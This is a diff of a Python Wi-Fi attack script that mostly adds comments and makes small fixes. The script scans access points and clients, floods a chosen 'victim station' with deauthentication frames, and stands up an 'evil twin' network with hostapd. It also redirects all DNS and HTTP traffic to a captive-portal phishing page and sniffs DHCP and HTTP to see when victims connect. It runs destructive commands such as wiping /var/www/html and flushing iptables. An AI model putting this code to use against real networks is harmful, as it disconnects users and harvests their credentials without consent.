@@ -78,13 +78,12 @@ def monitor_mode(iface):
         print("Make sure that this interface " + iface + " supports monitor mode")
 
 
-def add_ap(pkt):
-    global from_ch
+def add_ap(pkt): # add access points to dictionary
     global AP
     ssid = pkt[Dot11Beacon].network_stats()['ssid']
 
     bssid = pkt[Dot11].addr3.lower()  # ap mac address
-    ap_channel = str(from_ch)
+    ap_channel = str(ord(pkt[Dot11Elt:3].info))
     if bssid in AP:
         return
     else:
@@ -93,7 +92,7 @@ def add_ap(pkt):
         AP[bssid]['ESSID'] = ssid
 
 
-def add_client(pkt):
+def add_client(pkt): # add station/client to dictionary with his access point mapped to his mac
     global AP
     global client_AP
     ds = pkt.FCfield & 0x3  # frame control
@@ -132,9 +131,9 @@ def add_client(pkt):
 
 
 # ignore broadcasts from APs
-def noise_filter(addr1, addr2):
-    # Broadcast, broadcast, IPv6mcast, spanning tree, spanning tree, multicast, broadcast
-    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:',
+def noise_filter(addr1, addr2): # dont accept packets with broadcast or my mac
+    # Broadcast, broadcast
+    ignore = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00',
               mac]
 
     for i in ignore:
@@ -142,7 +141,7 @@ def noise_filter(addr1, addr2):
             return True
 
 
-def handler(pkt):
+def handler(pkt): #check for beaon frames to gather acess points and stations/clients
     if pkt.haslayer(Dot11):
 
         if pkt.haslayer(Dot11Beacon):  # AP
@@ -165,7 +164,7 @@ def mon_mac(mon_iface):
     return mon
 
 
-def sniffer(iface, ch):
+def sniffer(iface, ch): # sniff on channels 1-14
     global from_ch
     if ch:
         if int(ch[0]) not in range(1, 14) and int(ch[1]) not in range(1, 14):
@@ -182,14 +181,14 @@ def sniffer(iface, ch):
         to_ch = 14
     timeout = time.time() + 60  # a minute  from now
     while True:
-        os.system("iwconfig " + iface + " channel " + str(from_ch))  # switch channel
+        os.system("iwconfig " + iface + " channel " + str(from_ch))  # switch interface channel
         sniff(prn=handler, iface=iface, timeout=1)
-        from_ch = from_ch % to_ch + 1
+        from_ch = from_ch% to_ch + 1
         if time.time() > timeout:
             break
 
 
-def output():
+def output():# print add access points and info
     dash = '-' * 120
     global AP
     print(dash)
@@ -225,7 +224,7 @@ def output_client(net):
                                                        client_AP[i]['BSSID']))
 
 
-def deauth(target_mac, iface):
+def deauth(target_mac, iface):# send deauth packets to victim station
     global stop_thread
     global client_AP
     bssid = client_AP[target_mac]['BSSID']
@@ -235,10 +234,10 @@ def deauth(target_mac, iface):
     while True:
         sendp(frame, iface=iface, count=10, inter=.1, verbose=0)
         if stop_thread:
-            break;
+            break
 
 
-def configHostapd(iface, net):
+def configHostapd(iface, net):# configuration for our evil twin netword
     global AP
     # Hostapd configuration
     os.system("service hostapd stop")
@@ -261,7 +260,7 @@ def configHostapd(iface, net):
     print('[+] hostapd successfully configured')
 
 
-def configDnsmasq(iface):
+def configDnsmasq(iface): # configue dns for our evil twin and write rules such ass http traffic goes to captive portal...
     # Stop dnsmasq  in case it's active
     os.system('service dnsmasq stop')
     # Flush iptables to avoid conflicts
@@ -278,7 +277,6 @@ def configDnsmasq(iface):
     dnsmasqConfig += 'dhcp-option=3,192.168.1.1\n'  # Set router to 192.168.1.1
     dnsmasqConfig += 'dhcp-option=6,192.168.1.1\n'  # Set dns server to 192.168.1.1
     dnsmasqConfig += 'address=/#/192.168.1.1\n'  # Response to every DNS query with 192.168.1.1 (where our captive portal is)
-    dnsmasqConfig += 'address=/www.google.com/216.58.209.2\n'
     f = open(dnsmasqConfigFile, 'w')
     f.write(dnsmasqConfig)
     f.close()
@@ -296,7 +294,7 @@ def configDnsmasq(iface):
     print('[+] dnsmasq successfully configured')
 
 
-def config_portal():
+def config_portal(): # captive portal website html file and php configuration
     # Config captive portal files
     print('[+] Copying web files...')
     os.system('rm -r /var/www/html/* 2>/dev/null')  # delete all folders and files in this directory
@@ -314,7 +312,7 @@ def config_portal():
     os.system('service apache2 restart')
     print('[+] apache2 configured successfully\n')
 
-
+#capture dhcp and http packets in order to see victim interaction with our evil twin for instance if victim connected to captive portal
 def station_handler(pkt):
     global stop_thread
     global connected_stations
@@ -337,7 +335,7 @@ def sniff_dhcp(iface):
     sniff(iface=iface, filter='port 80 or (udp and (port 67 or port 68))', stop_filter=station_handler)
 
 
-def sig_handler(signum, frame):
+def sig_handler(signum, frame): # Not used
     global interface
     global stop_thread
 
@@ -391,14 +389,14 @@ if __name__ == "__main__":
     stop_thread = True
     t1.join()
     t2.join()
-    os.system("killall dnsmasq")
-    os.system("killall hostapd")
-    os.system('iptables -F')
+    os.system("killall dnsmasq") # stop dnsmasq
+    os.system("killall hostapd") # stop hostapd
+    os.system('iptables -F') # remove iptables rules
     os.system('iptables -t nat -F')
-    os.system("iw dev mon0 del")
+    os.system("iw dev mon0 del") # delete virtual interface
     # os.system("ifconfig " + str(interface) + " 10.0.0.12")
-    os.system("rm dnsmasq.conf")
-    os.system("rm hostapd.conf")
+    os.system("rm dnsmasq.conf") # delete dnsmasq file
+    os.system("rm hostapd.conf") #delete hostapd file
 
     print("Bye")
     sys.exit()
